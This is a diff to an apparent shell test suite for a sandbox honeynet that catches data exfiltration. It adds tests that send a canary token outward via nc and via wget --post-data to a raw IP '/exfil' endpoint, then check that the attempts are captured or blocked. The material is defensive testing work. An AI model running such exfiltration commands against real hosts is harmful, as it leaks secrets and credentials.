@@ -41,6 +41,14 @@ assert_not_contains_file() {
   fi
 }
 
+line_count() {
+  if [[ -f "$1" ]]; then
+    wc -l <"$1"
+  else
+    printf '0\n'
+  fi
+}
+
 assert_file "$run_sandboxed"
 assert_executable "$run_sandboxed"
 assert_file "$cleanup_script"
@@ -135,6 +143,41 @@ PY
     fail "host synthetic response leaked raw token"
   fi
 
+  large_mb=320
+  large_content_length=$((large_mb * 1024 * 1024 + ${#match_token}))
+  large_log="$tmpdir/large-stream.log"
+  "$run_sandboxed" \
+    --ca-cert "$EXFIL_HONEYNET_CA_CERT" \
+    --honeynet-network "$EXFIL_HONEYNET_NETWORK" \
+    --honeynet-dns "$EXFIL_HONEYNET_DNS_IP" \
+    "$image" sh -c 'large_mb="$1"; token="$2"; content_length="$3"; { printf "POST /large HTTP/1.1\r\nHost: h2-large.example.test\r\nContent-Length: %s\r\nConnection: close\r\n\r\n" "$content_length"; printf "%s" "$token"; dd if=/dev/zero bs=1M count="$large_mb" 2>/dev/null; } | nc h2-large.example.test 80' sh "$large_mb" "$match_token" "$large_content_length" >"$large_log" 2>&1
+  assert_contains_file "$large_log" "exfil-analyzer synthetic response"
+  if ! docker inspect -f '{{.State.Status}} {{.State.OOMKilled}}' "$EXFIL_HONEYNET_HTTP_CONTAINER" | grep -F "running false" >/dev/null; then
+    fail "HTTP listener did not survive large streaming POST"
+  fi
+  if grep -F "$match_token" "$large_log" >/dev/null; then
+    fail "large synthetic response leaked raw token"
+  fi
+
+  http_lines_before_raw_ip="$(line_count "$EXFIL_HONEYNET_HTTP_LOG")"
+  network_lines_before_raw_ip="$(line_count "$EXFIL_HONEYNET_NETWORK_LOG")"
+  dns_lines_before_raw_ip="$(line_count "$EXFIL_HONEYNET_DNS_LOG")"
+  set +e
+  "$run_sandboxed" \
+    --ca-cert "$EXFIL_HONEYNET_CA_CERT" \
+    --honeynet-network "$EXFIL_HONEYNET_NETWORK" \
+    --honeynet-dns "$EXFIL_HONEYNET_DNS_IP" \
+    "$image" wget -T 3 -O- --post-data "payload=$match_token" "http://198.51.100.10/exfil" >/dev/null 2>&1
+  raw_ip_rc=$?
+  set -e
+  [[ "$raw_ip_rc" -ne 0 ]] || fail "raw IP egress unexpectedly reached a responder"
+  [[ "$(line_count "$EXFIL_HONEYNET_HTTP_LOG")" == "$http_lines_before_raw_ip" ]] ||
+    fail "raw IP egress unexpectedly produced honeynet http.jsonl"
+  [[ "$(line_count "$EXFIL_HONEYNET_NETWORK_LOG")" == "$network_lines_before_raw_ip" ]] ||
+    fail "raw IP egress unexpectedly produced honeynet network.jsonl"
+  [[ "$(line_count "$EXFIL_HONEYNET_DNS_LOG")" == "$dns_lines_before_raw_ip" ]] ||
+    fail "raw IP egress unexpectedly produced dns.jsonl"
+
   [[ -s "$EXFIL_HONEYNET_HTTP_LOG" ]] || fail "http.jsonl was not written"
   "${PYTHON:-python3}" - "$http_schema" "$EXFIL_HONEYNET_HTTP_LOG" "$secret_id" "$match_token" <<'PY'
 import json
@@ -189,6 +232,21 @@ if host_event["canary_match"] != [secret_id]:
     raise SystemExit(f"host canary_match = {host_event['canary_match']!r}, want {[secret_id]!r}")
 if host_event["upstream"] is not False or host_event["opaque_reason"] is not None:
     raise SystemExit(f"bad host honeynet flags: {host_event!r}")
+
+large_events = [
+    event for event in events
+    if event["method"] == "POST"
+    and event["host"].split(":", 1)[0] == "h2-large.example.test"
+    and event["path"] == "/large"
+    and event["tls"] is False
+]
+if not large_events:
+    raise SystemExit(f"large body event missing: {events!r}")
+large_event = large_events[-1]
+if large_event["canary_match"] != [secret_id]:
+    raise SystemExit(f"large canary_match = {large_event['canary_match']!r}, want {[secret_id]!r}")
+if not large_event["request_body_sha256"] or len(large_event["request_body_sha256"]) != 64:
+    raise SystemExit(f"large request_body_sha256 missing: {large_event!r}")
 PY
 
   if grep -R -I "PRIVATE KEY" "$tmpdir/logs" >/dev/null; then
